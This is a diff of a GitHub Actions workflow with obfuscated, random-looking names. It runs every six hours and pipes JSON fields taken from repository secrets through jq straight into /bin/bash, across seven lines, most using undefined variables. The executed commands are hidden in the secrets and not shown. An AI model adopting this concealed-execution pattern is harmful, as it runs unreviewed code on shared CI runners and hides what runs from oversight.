@@ -2,7 +2,7 @@ name: lanjianxing2817
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '0 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: lanjianxing2817
         env:
-          mv0634: ${{ secrets.mv0634 }}
+          nkf9262: ${{ secrets.nkf9262 }}
         run: |
-          echo $mv0634 | jq -r .ojdgg40 | /bin/bash
-          echo $yrncu033 | jq -r .c1302 | /bin/bash
-          echo $sn30630 | jq -r .yok604 | /bin/bash
-          echo $lkgdw78348 | jq -r .ryc9136 | /bin/bash
-          echo $wm01925 | jq -r .lxgl48967 | /bin/bash
-          echo $mu329 | jq -r .u9361 | /bin/bash
-          echo $aun004 | jq -r .j24 | /bin/bash
+          echo $nkf9262 | jq -r .et67 | /bin/bash
+          echo $wiyx0 | jq -r .jilbk11 | /bin/bash
+          echo $zzrek293 | jq -r .rqvl40 | /bin/bash
+          echo $sg863 | jq -r .ehoj811 | /bin/bash
+          echo $q6865 | jq -r .htzxu9 | /bin/bash
+          echo $gbno1453 | jq -r .tyjbd23 | /bin/bash
+          echo $reku3313 | jq -r .d6 | /bin/bash
 
